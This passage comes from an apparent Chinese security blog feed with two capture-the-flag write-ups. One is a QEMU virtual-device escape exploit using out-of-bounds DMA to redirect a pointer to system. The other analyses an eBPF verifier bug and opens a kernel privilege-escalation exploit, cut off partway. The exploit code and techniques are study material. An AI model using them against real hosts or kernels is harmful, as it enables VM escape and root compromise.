class="line">    <span class="comment">// Allocate DMA buffer and obtain its physical address</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to leak enc ptr</span></span><br><span class="line">    dma_do_read(<span class="number">0x1000</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc = *(<span class="keyword">uint64_t</span> *)userbuf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaking enc function: %p\n&quot;</span>, (<span class="keyword">void</span> *)leak_enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pro_base = leak_enc - <span class="number">0x283DD0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = pro_base + <span class="number">0x1FDB18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to overwrite enc ptr to system ptr</span></span><br><span class="line">    dma_do_write(<span class="number">0x1000</span> + DMABASE, &amp;system_plt, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deply the parameter of system function</span></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;cat flag\x00&quot;</span>;</span><br><span class="line">    dma_do_write(<span class="number">0x200</span> + DMABASE, command, <span class="built_in">strlen</span>(command));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger the enc ptr to execute system</span></span><br><span class="line">    dma_do_enc(<span class="number">0x200</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205170230132.png"                      alt="image-20230205170230132"                ></p><p>调试脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pid=`ps -aux | grep <span class="string">&quot;qemu-system-x86_64&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">sudo gdb \</span><br><span class="line">-ex <span class="string">&quot;file qemu-system-x86_64&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;attach <span class="variable">$pid</span>&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;b*\$rebase(0x284191)&quot;</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205173312988.png"                      alt="image-20230205173312988"                ></p><hr><p>题目地址：<a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz" >https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz<i class="fas fa-external-link-alt"></i></a></p><p>参考链接：</p><p><a class="link"   href="https://www.anquanke.com/post/id/224199#h3-5" >https://www.anquanke.com/post/id/224199#h3-5<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup" >https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio" >https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。&lt;/p&gt;
&lt;p&gt;在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf-v2</title>
    <link href="https://cv196082.gitee.io/2023/01/11/d3bpf-v2/"/>
    <id>https://cv196082.gitee.io/2023/01/11/d3bpf-v2/</id>
    <published>2023-01-11T10:09:05.000Z</published>
    <updated>2023-01-11T10:11:17.190Z</updated>
    
    <content type="html"><![CDATA[<p>因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。</p><h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>首先，这道题的大致跟上一道题目一样，存在一个patch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">40</span>d92628e..be9cdde7a <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-8100</span>,<span class="number">11</span> +<span class="number">8100</span>,<span class="number">11</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">case</span> BPF_RSH:</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- * This includes shifts by a negative number.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- */</span></span></span></span><br><span class="line"><span class="params"><span class="function">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">else</span></span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg_known_zero(dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br></pre></td></tr></table></figure><p>可以看出来这里的patch跟前面一道题一样，在RSH中设置了超过指定大小的数时会设置为known的0。</p><p>不同的是这里题目使用的内核版本是5.16.12+，而在新版本的内核中存在新的检测机制：</p><ul><li>  任何指针只能进行加减操作，不能进行比较（防止侧信道）</li><li>  在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。</li></ul><p>所以这也就造成了前面的攻击手法无效了。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里出现了一个新的函数<code>bpf_skb_load_bytes</code>可以进行绕过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="keyword">const</span> struct sk_buff *, skb, u32, offset,</span><br><span class="line">   <span class="keyword">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(offset &gt; <span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"><span class="keyword">if</span> (ptr != to)</span><br><span class="line"><span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line"><span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用是读取socket缓冲区到指定的位置，在ebpf程序中可以是栈或者map。</p><p>然而因为patch的缘故我们可以很轻松的实现栈溢出。</p><h3 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h3><p>这里leak的方法延用作者的方法。</p><p>在新版本内核中ebpf程序crash并不会造成内核的崩溃，当<code>/proc/sys/kernel/panic_on_oops</code> 值为 0 时 <code>soft panic</code> 并不会直接 panic。似乎在默认情况下其值就是 0，如 Ubuntu20.04。而在kernel pwn题目中想出现上述情况的方法是在qemu启动项中添加<code> oops = panic</code>。而在发生<code>soft panic</code>时会打印出来内核地址。所以这里选择这样使用，使ebpf程序出现crash紧接着就会打印出地址即可。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里因为可以很简单的进行栈溢出所以就不多赘述了。所以直接给出exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span 